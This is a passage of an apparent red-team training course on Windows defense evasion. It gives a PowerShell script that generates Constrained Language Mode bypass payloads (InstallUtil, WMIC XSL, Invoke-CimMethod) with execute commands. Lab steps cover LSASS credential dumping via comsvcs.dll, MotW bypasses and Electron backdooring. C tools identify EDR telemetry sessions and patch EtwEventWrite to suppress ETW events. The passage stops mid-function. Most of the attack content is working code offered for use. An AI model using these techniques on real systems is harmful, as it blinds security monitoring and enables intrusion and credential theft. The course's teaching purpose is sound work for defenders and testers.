    public static void Main(string[] args) {
        Console.WriteLine("[*] Normal execution");
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer {
    public override void Uninstall(System.Collections.IDictionary savedState) {
        Console.WriteLine("[+] InstallUtil CLM Bypass Executed!");
        Console.WriteLine("[+] Process: " + Process.GetCurrentProcess().ProcessName);
        Process.Start("calc.exe");
    }
}
'@

        $csPath = ".\clm_bypass_installutil.cs"
        $installUtilPayload | Out-File -FilePath $csPath -Encoding ASCII
        Write-Host "    [+] Payload written to: $csPath"
        Write-Host "`n    [*] To execute:"
        Write-Host "    1. Compile: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library $csPath"
        Write-Host "    2. Execute: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U clm_bypass_installutil.dll"
    } else {
        Write-Host "    Use -Execute to generate payload files"
    }
}

function Invoke-WmicBypass {
    param([switch]$Execute)

    Write-Host "`n[*] BYPASS 4: WMIC XSL Transform"

    $wmic = Get-Command wmic.exe -ErrorAction SilentlyContinue
    if ($wmic) {
        Write-Host "    [+] WMIC available"

        if ($Execute) {
            $xslPayload = @'
<?xml version="1.0"?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform"
            xmlns:ms="urn:schemas-microsoft-com:xslt"
            xmlns:user="placeholder" version="1.0">
  <output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
      var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
    ]]>
  </ms:script>
  <template match="/">
    <value-of select="user:a()"/>
  </template>
</stylesheet>
'@
            $xslPath = ".\clm_bypass_wmic.xsl"
            $xslPayload | Out-File -FilePath $xslPath -Encoding ASCII
            Write-Host "    [+] XSL payload written to: $xslPath"
            Write-Host "    [*] Execute: wmic process list /format:$xslPath"
        } else {
            Write-Host "    Use -Execute to generate XSL payload"
        }
    } else {
        Write-Host "    [-] WMIC not available (removed in newer Windows 11)"
    }
}

function Invoke-CimBypass {
    param([switch]$Execute)

    Write-Host "`n[*] BYPASS 5: Approved Cmdlet Abuse (Invoke-CimMethod)"
    Write-Host "    Even in CLM, approved cmdlets like Invoke-CimMethod work"

    if ($Execute) {
        Write-Host "`n    [+] Executing calc.exe via WMI/CIM..."
        try {
            Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}
            Write-Host "    [+] Process created successfully via CIM!"
        } catch {
            Write-Host "    [-] Failed: $($_.Exception.Message)"
        }
    } else {
        Write-Host "    Use -Execute to run calc.exe via Invoke-CimMethod"
    }
}

$mode = Check-LanguageMode

if ($mode -eq "FullLanguage") {
    Write-Host "`n[!] System is in FullLanguage mode - CLM bypasses not needed"
    Write-Host "[!] Run with -Execute to test bypass techniques anyway"
}

switch ($Technique.ToLower()) {
    "runspace" { Invoke-RunspaceBypass -Execute:$Execute }
    "psv2" { Invoke-PSv2Bypass -Execute:$Execute }
    "lolbin" { Invoke-LolbinEscape -Execute:$Execute }
    "wmic" { Invoke-WmicBypass -Execute:$Execute }
    "cim" { Invoke-CimBypass -Execute:$Execute }
    default {
        Invoke-RunspaceBypass -Execute:$Execute
        Invoke-PSv2Bypass -Execute:$Execute
        Invoke-LolbinEscape -Execute:$Execute
        Invoke-WmicBypass -Execute:$Execute
        Invoke-CimBypass -Execute:$Execute
    }
}

Write-Host @"

USAGE:
  .\clm_bypass.ps1                    # Check all techniques
  .\clm_bypass.ps1 -Execute           # Execute all bypasses
  .\clm_bypass.ps1 -Technique cim -Execute  # Execute specific bypass

BYPASS ORDER:
1. Try PowerShell v2 downgrade first (if enabled)
2. If blocked, escape to InstallUtil/RegSvcs (NOT MSBuild - AMSI blocked)
3. Use Invoke-CimMethod for process creation in CLM
4. If .NET tools blocked, try WMIC XSL (if available)
5. Remember: CLM is enforced BY WDAC Script Enforcement
   -> Bypassing WDAC = bypassing CLM automatically!
"@
```

### Practical Exercise

**Lab 5.1: WDAC Policy Audit**

1. Deploy a WDAC policy in audit mode on your test VM
2. Run Event Viewer and filter for Code Integrity events (Event ID 3076/3077)
3. Analyze which binaries would be blocked in enforcement mode
4. Document the trust chain for each allowed binary
5. Test the wdac_analyzer.exe tool to enumerate active policies

**Lab 5.2: LOLBAS Execution**

1. ~~Use MSBuild.exe~~ (BLOCKED by AMSI)
2. Use InstallUtil.exe to execute a payload DLL (WORKING)
   - Compile: `csc.exe /target:library clm_bypass_installutil.cs`
   - Execute: `InstallUtil.exe /logfile= /LogToConsole=false /U clm_bypass_installutil.dll`
3. Use RegSvcs.exe to execute via COM registration (WORKING)
4. Test mshta.exe with HTA payload (if not removed in 25H2)
5. Run wdac_bypass_tester.exe to test all techniques automatically
6. Document which LOLBAS are blocked by strict WDAC policies

**Lab 5.3: ASR Rule Testing**

1. Enable all ASR rules in audit mode
2. Attempt credential theft from LSASS - observe ASR block
3. Test bypass via comsvcs.dll MiniDump method
4. Test Office child process bypass via Invoke-CimMethod (WMI)
5. Test bypass via COM automation (WScript.Shell)
6. Verify ASR doesn't monitor Electron app internals

**Lab 5.4: MotW and SAC Analysis**

1. Download a binary and observe Zone.Identifier ADS (`dir /r`)
2. Test FileFix attack
   - Save HTML as "Webpage, Complete"
   - Rename to .HTA extension
   - Verify no MotW tag applied
   - Execute and observe mshta.exe bypass
3. Test LNK file MotW bypass
4. Document SAC behavior on your test system (Evaluation/On/Off)
5. Note: SAC toggle feature is in Windows Insider testing (not production yet)

**Lab 5.5: Electron V8 Snapshot Backdooring**

1. Install VS Code or another Electron app
2. Run deploy_v8_backdoor.exe to identify target
3. Check if app directory is user-writable (vulnerability indicator)
4. Note V8 version mismatch challenges
5. Understand why this bypasses WDAC (signed app loads unsigned snapshot)

**Lab 5.6: CLM Bypass Testing**

1. Run clm_bypass.ps1 to check current language mode
2. Execute with `-Execute` flag to test all bypasses
3. Test specific bypass: `.\clm_bypass.ps1 -Technique cim -Execute`
4. Verify Invoke-CimMethod works even in CLM
5. Generate and compile InstallUtil payload to escape PowerShell entirely

### Key Takeaways

- **WDAC is the strongest execution control** - kernel-enforced, admin cannot disable
- **LOLBAS landscape changed** - MSBuild now blocked by AMSI, use InstallUtil/RegSvcs instead
- **FileFix is the newest MotW bypass** - HTML saved as "Webpage, Complete" doesn't get MotW tag
- **Electron apps are a major WDAC gap** - V8 snapshots not code-signed, can be backdoored if directory is writable
- **ASR rules are behavior-based** - bypass by using different behavior (COM instead of CreateProcess)
- **ASR doesn't monitor Electron internals** - V8 snapshot tampering, ASAR backdooring completely undetected
- **SAC toggle coming** - Currently in Windows Insider testing, will enable re-enabling after disable
- **DLL sideloading partially patched** - System DLLs protected, but OneDrive/Teams/Edge still vulnerable
- **CLM is enforced by WDAC Script Enforcement** - Bypass WDAC = bypass CLM automatically
- **Invoke-CimMethod works in CLM** - Approved cmdlets can still create processes via WMI
- **This is entirely different from exploit mitigations** - WDAC/ASR block _execution_, not _exploit success_

### Discussion Questions

1. **Can WDAC ever be truly unbypassable?** What would that require?
   - Consider: Microsoft-signed binaries must be trusted for OS to function
   - LOLBAS binaries like InstallUtil are legitimate tools with dual-use capability
   - Electron apps load unsigned V8 snapshots by design
   - Would blocking all script execution break legitimate workflows?

2. **Why did Microsoft block MSBuild but not InstallUtil/RegSvcs?**
   - MSBuild was heavily abused and got AMSI scanning in 24H2/25H2
   - InstallUtil/RegSvcs are less known but equally powerful
   - Is this security through obscurity or prioritization?
   - How long until these get blocked too?

3. **Why is Electron app backdooring such a significant WDAC bypass?**
   - Signed application (trusted by WDAC) loads unsigned snapshot
   - No integrity checking on V8 snapshots by default
   - User-writable app directories in many installations
   - Affects VS Code, Discord, Slack, Teams, Edge - widely deployed apps
   - What would it take to fix this? (Code signing snapshots? Integrity checks?)

4. **FileFix attack - why is this still unpatched?**
   - HTML saved as "Webpage, Complete" doesn't get MotW tag
   - mshta.exe is Microsoft-signed and trusted by SAC
   - Requires user interaction (save + rename)
   - Is the social engineering barrier enough security?
   - Should mshta.exe be removed entirely? (Already gone in some 25H2 builds)

5. **ASR rules vs WDAC - different layers, different bypasses**
   - ASR blocks CreateProcess from Office -> bypass with COM/WMI
   - ASR blocks LSASS access -> bypass with comsvcs.dll
   - ASR doesn't monitor Electron apps -> V8 snapshot backdooring undetected
   - Can behavior-based rules ever catch all attack variations?

6. **SAC toggle feature - security improvement or risk?**
   - Currently: Disable once = permanent (requires reinstall to re-enable)
   - Future: Toggle on/off anytime (Windows Insider testing)
   - Pros: Users won't permanently disable due to false positives
   - Cons: Social engineering to disable becomes easier
   - Which approach is more secure in practice?

7. **CLM bypass via Invoke-CimMethod - why is this allowed?**
   - CLM blocks dangerous .NET APIs but allows approved cmdlets
   - Invoke-CimMethod can create processes via WMI
   - Is this a necessary exception for legitimate admin tasks?
   - How would you design CLM to block this without breaking workflows?

8. **DLL sideloading - why are Microsoft apps still vulnerable?**
   - Windows 11 protects system DLLs (kernel32.dll, ntdll.dll)
   - But OneDrive, Teams, Edge still vulnerable (2025 attacks documented)
   - Why not extend protection to all Microsoft apps?
   - Performance cost? Compatibility issues? Oversight?

9. **The fundamental tension: Security vs Functionality**
   - Blocking all unsigned code breaks development workflows
   - Trusting Microsoft-signed binaries enables LOLBAS
   - Allowing script execution enables CLM bypasses
   - Where should the line be drawn?
   - Is there a way to have both security and usability?

## Day 6: ETW Manipulation and Telemetry Blinding

- **Goal**: Understand Event Tracing for Windows (ETW) architecture and learn to blind, tamper with, and abuse the telemetry pipeline that feeds EDR, Defender, and SIEM.
- **Activities**:
  - _Reading_:
    - [Microsoft - ETW Architecture](https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing)
    - [Matt Graeber - Subverting Sysmon](https://specterops.io/blog/) - ETW-based evasion research
    - [Adam Chester - Hiding Your .NET ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw/) - .NET ETW patching
    - [Palantir - Tampering with Windows Event Tracing](https://blog.palantir.com/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63) - Comprehensive ETW tampering guide
    - [Binarly - ETW Internals](https://www.binarly.io/blog/design-issues-of-modern-edrs-bypassing-etw-based-solutions) - Deep ETW kernel internals
  - _Online Resources_:
    - [Introduction to ETW](https://www.youtube.com/watch?v=-i_xAF7JqyA)
    - [Silent Intruders](https://www.youtube.com/watch?v=0FDZGIcAMPQ)
    - [Live Off the .NET Gadgets](https://www.youtube.com/watch?v=U_mVcJ8oOtE)

ETW is the **nervous system** of Windows telemetry. Every security product - Defender, CrowdStrike, SentinelOne, Sysmon - depends on ETW events. If you can blind ETW, you blind the entire defensive stack.

### Context: ETW in the Security Stack

```text
┌─────────────────────────────────────────────────────────────────┐
│              ETW in the Windows Security Pipeline               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  YOUR CODE EXECUTES                                             │
│       │                                                         │
│       ▼                                                         │
│  ┌─────────────────┐     ┌─────────────────────────────┐        │
│  │ ETW Providers   │  -> │ ETW Tracing Sessions        │        │
│  │ (Instrumented   │     │ (Kernel buffers)            │        │
│  │  in OS/Runtime) │     └──────────┬──────────────────┘        │
│  └─────────────────┘                │                           │
│                                     ▼                           │
│  Key Providers:              ┌──────────────────┐               │
│  ├─ Microsoft-Windows-       │ ETW Consumers    │               │
│  │  Threat-Intelligence      │ (Real-time)      │               │
│  │  (kernel, PPL-protected)  ├──────────────────┤               │
│  ├─ Microsoft-Windows-       │ - Defender ATP   │               │
│  │  DotNETRuntime            │ - CrowdStrike    │               │
│  ├─ Microsoft-Windows-       │ - SentinelOne    │               │
│  │  PowerShell               │ - Sysmon         │               │
│  ├─ Microsoft-Windows-       │ - Event Log Svc  │               │
│  │  Kernel-Process           │ - Custom SIEM    │               │
│  ├─ Microsoft-Windows-       └──────────────────┘               │
│  │  Kernel-Registry                                             │
│  └─ Microsoft-Windows-                                          │
│     Security-Auditing                                           │
│                                                                 │
│  ATTACK SURFACE:                                                │
│  ├─ Provider registration patches (usermode)                    │
│  ├─ Consumer session tampering                                  │
│  ├─ Event log manipulation                                      │
│  ├─ Kernel ETW structure corruption                             │
│  └─ Trace session hijacking                                     │
│                                                                 │
│  WEEK 7 DAY 6 vs DAY 3 (PPL):                                   │
│  Day 3 bypassed PPL to reach LSASS/Defender processes           │
│  Day 6 disables the TELEMETRY those processes generate          │
│  Both blind the defender - different layer                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Deliverables

- [ ] Map ETW providers consumed by at least 2 security products
- [ ] Patch a usermode ETW provider to suppress .NET assembly load events
- [ ] Blind the Threat Intelligence ETW provider (kernel-level)
- [ ] Tamper with Windows Event Log to remove specific entries
- [ ] Build a modular ETW blinding tool

### ETW Architecture Deep Dive

```c
// etw_architecture.c
// Compile: cl src\etw_architecture.c /Fe:bin\etw_architecture.exe advapi32.lib tdh.lib

#include <windows.h>
#include <evntrace.h>
#include <tdh.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "tdh.lib")

/*
ETW Architecture - Three Components:
═════════════════════════════════════

1. PROVIDERS - Generate events
   Registration: EventRegister() -> NtTraceControl (syscall)
   Kernel struct: _ETW_REG_ENTRY -> _ETW_GUID_ENTRY

2. SESSIONS (Controllers) - Collect events in kernel buffers
   Max 64 sessions. Each subscribes to providers via EnableTraceEx2().

3. CONSUMERS - Read events (real-time or .etl files)
   Defender/EDR = real-time consumers.

ATTACK VECTORS:
   [A] Patch Provider: ntdll!EtwEventWrite -> xor rax,rax; ret
   [B] Kill Session:   ControlTrace(EVENT_TRACE_CONTROL_STOP)
   [C] Blind Consumer: Reduce session buffer / disable keywords
   [D] Kernel patch:   Zero _TRACE_ENABLE_INFO.IsEnabled
*/

// Security-critical provider GUIDs we want to flag
static const struct { GUID guid; const char* name; const char* risk; } g_secProviders[] = {
    { {0xF4E1897C,0xBB5D,0x5668,{0xF1,0xD8,0x04,0x0F,0x4D,0x8D,0xD3,0x44}},
      "Microsoft-Windows-Threat-Intelligence",
      "CRITICAL - kernel memory ops, PPL-protected consumer" },
    { {0xE13C0D23,0xCCBC,0x4E12,{0x93,0x1B,0xD9,0xCC,0x2E,0xEE,0x27,0xE4}},
      ".NET Runtime",
      "HIGH - assembly loads, JIT, used by Defender" },
    { {0xA0C1853B,0x5C40,0x4B15,{0x87,0x66,0x3C,0xF1,0xC5,0x8F,0x98,0x5A}},
      "Microsoft-Windows-PowerShell",
      "HIGH - script block logging, module loads" },
    { {0x22FB2CD6,0x0E7B,0x422B,{0xA0,0xC7,0x2F,0xAD,0x1F,0xD0,0xE7,0x16}},
      "Microsoft-Windows-Kernel-Process",
      "MEDIUM - process creation/termination" },
    { {0x0CCE985F,0x223A,0x4A15,{0xB5,0xCD,0xDB,0x3B,0x65,0xC7,0xB7,0xBA}},
      "Microsoft-Windows-Kernel-File",
      "MEDIUM - file I/O telemetry" },
};

// ── Enumerate ALL active ETW tracing sessions ───────────────

void EnumerateActiveSessions() {
    printf("=== Active ETW Tracing Sessions ===\n\n");

    // QueryAllTraces returns all active sessions on the system
    PEVENT_TRACE_PROPERTIES pSessions[64];
    ULONG sessionCount = 0;
    ULONG bufSize = sizeof(EVENT_TRACE_PROPERTIES) + 1024;  // name buffer

    for (int i = 0; i < 64; i++) {
        pSessions[i] = (PEVENT_TRACE_PROPERTIES)calloc(1, bufSize);
        pSessions[i]->Wnode.BufferSize = bufSize;
        pSessions[i]->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
        pSessions[i]->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + 512;
    }

    ULONG status = QueryAllTracesA(pSessions, 64, &sessionCount);
    if (status != ERROR_SUCCESS) {
        printf("[-] QueryAllTraces failed: %lu\n", status);
        printf("    Requires admin for full enumeration\n");
        // Even non-admin can see some sessions
    }

    printf("  Active sessions: %lu / 64 max\n\n", sessionCount);
    printf("  %-4s %-40s %-10s %-8s %s\n",
           "ID", "Session Name", "Buffers", "Lost", "Flags");
    printf("  %-4s %-40s %-10s %-8s %s\n",
           "--", "------------", "-------", "----", "-----");

    for (ULONG i = 0; i < sessionCount; i++) {
        char* sessionName = (char*)pSessions[i] + pSessions[i]->LoggerNameOffset;
        BOOL isSecurityRelevant = FALSE;

        // Flag sessions that look security-related
        if (strstr(sessionName, "Defend") || strstr(sessionName, "defend") ||
            strstr(sessionName, "EventLog") || strstr(sessionName, "DiagTrack") ||
            strstr(sessionName, "Threat") || strstr(sessionName, "Sentinel") ||
            strstr(sessionName, "CrowdStrike") || strstr(sessionName, "Falcon") ||
            strstr(sessionName, "Carbon") || strstr(sessionName, "Sysmon") ||
            strstr(sessionName, "Elastic") || strstr(sessionName, "SIEM")) {
            isSecurityRelevant = TRUE;
        }

        printf("  %-4lu %s%-40s%s %-10lu %-8lu 0x%04X\n",
               i,
               isSecurityRelevant ? "[!] " : "    ",
               sessionName,
               isSecurityRelevant ? " <-- SECURITY" : "",
               pSessions[i]->NumberOfBuffers,
               pSessions[i]->EventsLost,
               pSessions[i]->EnableFlags);

        if (isSecurityRelevant) {
            printf("        -> Buffer size: %lu KB, Min buffers: %lu\n",
                   pSessions[i]->BufferSize, pSessions[i]->MinimumBuffers);
            printf("        -> ATTACK: ControlTrace(STOP) or reduce BufferSize\n");
        }
    }

    for (int i = 0; i < 64; i++) free(pSessions[i]);
}

// ── Enumerate registered ETW providers via TDH ──────────────

void EnumerateSecurityProviders() {
    printf("\n=== Registered ETW Providers (Security-Relevant) ===\n\n");

    DWORD bufSize = 0;
    DWORD status = TdhEnumerateProviders(NULL, &bufSize);
    if (status != ERROR_INSUFFICIENT_BUFFER) {
        printf("[-] TdhEnumerateProviders failed: %lu\n", status);
        return;
    }

    PPROVIDER_ENUMERATION_INFO pProviders = (PPROVIDER_ENUMERATION_INFO)malloc(bufSize);
    status = TdhEnumerateProviders(pProviders, &bufSize);
    if (status != ERROR_SUCCESS) {
        printf("[-] TdhEnumerateProviders failed: %lu\n", status);
        free(pProviders);
        return;
    }

    printf("  Total registered providers: %lu\n\n", pProviders->NumberOfProviders);

    // Search for our security-critical providers
    int foundCount = 0;
    for (DWORD i = 0; i < pProviders->NumberOfProviders; i++) {
        PTRACE_PROVIDER_INFO pInfo = &pProviders->TraceProviderInfoArray[i];

        for (int s = 0; s < _countof(g_secProviders); s++) {
            if (IsEqualGUID(&pInfo->ProviderGuid, &g_secProviders[s].guid)) {
                wchar_t* provName = (wchar_t*)((BYTE*)pProviders +
                                    pInfo->ProviderNameOffset);
                printf("  [%d] %ls\n", ++foundCount, provName);
                printf("      GUID: {%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\n",
                       pInfo->ProviderGuid.Data1,
                       pInfo->ProviderGuid.Data2,
                       pInfo->ProviderGuid.Data3,
                       pInfo->ProviderGuid.Data4[0], pInfo->ProviderGuid.Data4[1],
                       pInfo->ProviderGuid.Data4[2], pInfo->ProviderGuid.Data4[3],
                       pInfo->ProviderGuid.Data4[4], pInfo->ProviderGuid.Data4[5],
                       pInfo->ProviderGuid.Data4[6], pInfo->ProviderGuid.Data4[7]);
                printf("      Risk: %s\n\n", g_secProviders[s].risk);
                break;
            }
        }
    }

    // Also count total providers for attack surface assessment
    int kernelProviders = 0, userProviders = 0;
    for (DWORD i = 0; i < pProviders->NumberOfProviders; i++) {
        if (pProviders->TraceProviderInfoArray[i].SchemaSource == 0)
            userProviders++;
        else
            kernelProviders++;
    }
    printf("  Provider distribution: ~%d manifest-based, ~%d other\n",
           userProviders, kernelProviders);

    free(pProviders);
}

// ── Check if EtwEventWrite is already patched ───────────────

void CheckEtwPatchStatus() {
    printf("\n=== EtwEventWrite Integrity Check ===\n\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] ntdll not loaded?!\n");
        return;
    }

    BYTE* pEtwWrite = (BYTE*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwWrite) {
        printf("[-] EtwEventWrite not found\n");
        return;
    }

    printf("  EtwEventWrite @ 0x%p\n", pEtwWrite);
    printf("  First 16 bytes: ");
    for (int i = 0; i < 16; i++)
        printf("%02X ", pEtwWrite[i]);
    printf("\n");

    // Known patch signatures
    // xor rax,rax; ret = 48 33 C0 C3  or  48 31 C0 C3
    // ret = C3
    BOOL patched = FALSE;
    if (pEtwWrite[0] == 0x48 &&
        (pEtwWrite[1] == 0x33 || pEtwWrite[1] == 0x31) &&
        pEtwWrite[2] == 0xC0 && pEtwWrite[3] == 0xC3) {
        printf("  [!] PATCHED: xor rax,rax; ret detected!\n");
        printf("      ETW events from this process are SUPPRESSED\n");
        patched = TRUE;
    } else if (pEtwWrite[0] == 0xC3) {
        printf("  [!] PATCHED: immediate ret detected!\n");
        patched = TRUE;
    }

    if (!patched) {
        printf("  [+] EtwEventWrite appears INTACT (not patched)\n");

        // Also check for hooks (JMP to trampoline)
        if (pEtwWrite[0] == 0xE9 || pEtwWrite[0] == 0xFF) {
            printf("  [?] But starts with JMP/CALL - possible EDR hook\n");
            printf("      This is DEFENSIVE hooking (EDR monitoring calls)\n");
        }
    }

    // Also check EtwEventWriteEx and EtwEventWriteFull
    BYTE* pWriteEx = (BYTE*)GetProcAddress(hNtdll, "EtwEventWriteEx");
    BYTE* pWriteFull = (BYTE*)GetProcAddress(hNtdll, "EtwEventWriteFull");
    if (pWriteEx) {
        printf("\n  EtwEventWriteEx @ 0x%p - ", pWriteEx);
        if (pWriteEx[0] == 0x48 && pWriteEx[2] == 0xC0 && pWriteEx[3] == 0xC3)
            printf("PATCHED\n");
        else
            printf("intact\n");
    }
    if (pWriteFull) {
        printf("  EtwEventWriteFull @ 0x%p - ", pWriteFull);
        if (pWriteFull[0] == 0x48 && pWriteFull[2] == 0xC0 && pWriteFull[3] == 0xC3)
            printf("PATCHED\n");
        else
            printf("intact\n");
    }
}

// ── Identify EDR/security sessions for targeted blinding ────

void IdentifyEDRSessions() {
    printf("\n=== EDR Session Identification ===\n\n");

    // Known EDR session name patterns
    const char* edrPatterns[] = {
        "Defender", "MsMpEng", "WinDefend", "SenseIR", "MsSense",
        "MpWpp",  // Windows Defender WPP tracing sessions
        "CrowdStrike", "Falcon", "CSFalcon",
        "SentinelOne", "Sentinel",
        "CarbonBlack", "Cb Defense",
        "Cylance",
        "Elastic", "Winlogbeat",
        "Sysmon",
        "DiagTrack",
        NULL
    };

    PEVENT_TRACE_PROPERTIES pSessions[64];
    ULONG sessionCount = 0, bufSize = sizeof(EVENT_TRACE_PROPERTIES) + 1024;

    for (int i = 0; i < 64; i++) {
        pSessions[i] = (PEVENT_TRACE_PROPERTIES)calloc(1, bufSize);
        pSessions[i]->Wnode.BufferSize = bufSize;
        pSessions[i]->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
        pSessions[i]->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + 512;
    }

    if (QueryAllTracesA(pSessions, 64, &sessionCount) == ERROR_SUCCESS) {
        for (ULONG i = 0; i < sessionCount; i++) {
            char* name = (char*)pSessions[i] + pSessions[i]->LoggerNameOffset;
            for (int p = 0; edrPatterns[p]; p++) {
                if (strstr(name, edrPatterns[p])) {
                    printf("  [!] EDR SESSION: %s\n", name);
                    printf("      Handle: %llu\n",
                           pSessions[i]->Wnode.HistoricalContext);
                    printf("      Buffers: %lu (size: %lu KB)\n",
                           pSessions[i]->NumberOfBuffers,
                           pSessions[i]->BufferSize);
                    printf("      Events lost: %lu\n",
                           pSessions[i]->EventsLost);
                    printf("      ATTACK OPTIONS:\n");
                    printf("        - ControlTrace(STOP) [requires SYSTEM]\n");
                    printf("        - Reduce BufferSize to cause event loss\n");
                    printf("        - Flush buffers to .etl then delete\n\n");
                    break;
                }
            }
        }
    }

    for (int i = 0; i < 64; i++) free(pSessions[i]);
}

int main() {
    printf("----------------------------------------\n");
    printf("ETW Offensive Reconnaissance Tool\n");
    printf("----------------------------------------\n\n");

    EnumerateActiveSessions();
    EnumerateSecurityProviders();
    CheckEtwPatchStatus();
    IdentifyEDRSessions();

    printf("\n----------------------------------------\n");
    printf("ATTACK PLAYBOOK:\n");
    printf("  1. Patch EtwEventWrite in YOUR process (4 bytes)\n");
    printf("  2. Patch EtwEventWriteEx too (some EDRs use it)\n");
    printf("  3. For .NET: patch before CLR loads assemblies\n");
    printf("  4. For PowerShell: patch before script execution\n");
    printf("  5. TI ETW: requires kernel R/W (BYOVD/exploit)\n");
    printf("  6. Event Log: Phant0m technique (suspend threads)\n");
    printf("----------------------------------------\n");

    return 0;
}
```

**Compile and Run**:

```bash
cl src\etw_architecture.c /Fe:bin\etw_architecture.exe advapi32.lib tdh.lib
# run as admin:
.\bin\etw_architecture.exe
```

### ETW Bypass

see if any of the following methods actually work

#### Technique 1: Usermode ETW Provider Patching

```c
// etw_patch.c - Patch ETW provider registration to suppress events
// Compile: cl src\etw_patch.c /Fe:bin\etw_patch.exe advapi32.lib

#include <windows.h>
#include <evntrace.h>
#include <evntprov.h>
#include <stdio.h>
#include <psapi.h>
#include <time.h>

#pragma comment(lib, "advapi32.lib")

/*
TECHNIQUE: Patch ntdll!EtwEventWrite
═════════════════════════════════════

When a .NET assembly loads, the CLR calls:
  clr!ETW::CEtwTracer::EmitEvent()
    -> ntdll!EtwEventWrite()
      -> NtTraceControl() [syscall]

If we patch EtwEventWrite to return immediately (ret 0),
NO ETW events from this process reach any consumer.

This blinds:
  ├── .NET assembly load events (Defender)
  ├── PowerShell script block logging
  ├── Process activity telemetry
  └── Any usermode ETW from this process

LIMITATION: Only affects OUR process. Other processes
still generate events. Kernel providers unaffected.

NOTE: Modern EDRs increasingly rely on kernel ETW providers
which bypass this technique. Still effective against usermode telemetry.

PRIVILEGE REQUIREMENTS:
  - NO admin required for patching (modifying own process memory)
  - Admin MAY be required to view ETW sessions for verification
  - The patch itself works as regular user
*/

// Store original bytes for restoration
BYTE g_originalEtwEventWrite[16] = {0};
BYTE g_originalEtwEventWriteEx[16] = {0};
BYTE g_originalEtwEventWriteFull[16] = {0};

BOOL PatchEtwFunction(const char* funcName, BYTE* originalBytes) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    FARPROC pFunc = GetProcAddress(hNtdll, funcName);
    if (!pFunc) {
        printf("[-] Failed to get %s address\n", funcName);
        return FALSE;
    }

    printf("[*] %s @ 0x%p\n", funcName, pFunc);

    // Save original bytes for restoration
    memcpy(originalBytes, pFunc, 16);

    // Display original bytes
    printf("    Original bytes: ");
    for (int i = 0; i < 16; i++) {
        printf("%02X ", originalBytes[i]);
    }
    printf("\n");

    // Patch: xor rax, rax; ret (return STATUS_SUCCESS = 0)
    // This makes every ETW event call succeed silently without writing
    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };  // xor rax, rax; ret

    DWORD oldProtect;
    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    memcpy(pFunc, patch, sizeof(patch));

    if (!VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect)) {
        printf("[-] VirtualProtect restore failed: %d\n", GetLastError());
    }

    // Verify patch
    BYTE verify[4];
    memcpy(verify, pFunc, 4);
    if (memcmp(verify, patch, 4) == 0) {
        printf("[+] %s patched successfully\n", funcName);
        return TRUE;
    } else {
        printf("[-] %s patch verification failed\n", funcName);
        return FALSE;
    }
}

BOOL PatchEtwEventWrite() {
    printf("\n=== Patching EtwEventWrite Functions ===\n\n");

    BOOL success = TRUE;

    // Patch main EtwEventWrite
    if (!PatchEtwFunction("EtwEventWrite", g_originalEtwEventWrite)) {
        success = FALSE;
    }

    // Patch EtwEventWriteEx (used by some providers)
    if (!PatchEtwFunction("EtwEventWriteEx", g_originalEtwEventWriteEx)) {
        printf("[!] EtwEventWriteEx patch failed (may not exist on this system)\n");
    }

    // Patch EtwEventWriteFull (comprehensive variant)
    if (!PatchEtwFunction("EtwEventWriteFull", g_originalEtwEventWriteFull)) {
        printf("[!] EtwEventWriteFull patch failed (may not exist on this system)\n");
    }

    return success;
}

BOOL RestoreEtwFunction(const char* funcName, BYTE* originalBytes) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pFunc = GetProcAddress(hNtdll, funcName);
    if (!pFunc) return FALSE;

    DWORD oldProtect;
    if (!VirtualProtect(pFunc, 16, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    memcpy(pFunc, originalBytes, 16);
    VirtualProtect(pFunc, 16, oldProtect, &oldProtect);

    printf("[+] %s restored to original state\n", funcName);
    return TRUE;
}

BOOL RestoreEtwEventWrite() {
    printf("\n=== Restoring Original ETW Functions ===\n\n");

    RestoreEtwFunction("EtwEventWrite", g_originalEtwEventWrite);
    RestoreEtwFunction("EtwEventWriteEx", g_originalEtwEventWriteEx);
    RestoreEtwFunction("EtwEventWriteFull", g_originalEtwEventWriteFull);

    return TRUE;
}

/*
TECHNIQUE: Test ETW suppression with real events AND verify via logman
═══════════════════════════════════════════════════════════════════════

Register a test provider and emit events before/after patching.
Then use logman to create a trace session and verify events are suppressed.
*/

// Test provider GUID: {12345678-1234-1234-1234-123456789012}
static const GUID TestProviderGuid =
    { 0x12345678, 0x1234, 0x1234, { 0x12, 0x34, 0x12, 0x34, 0x56, 0x78, 0x90, 0x12 } };

void StartEtwTraceSession() {
    printf("\n[*] Attempting to start ETW trace session...\n");
    printf("    (Requires admin - will fail silently if not admin)\n");

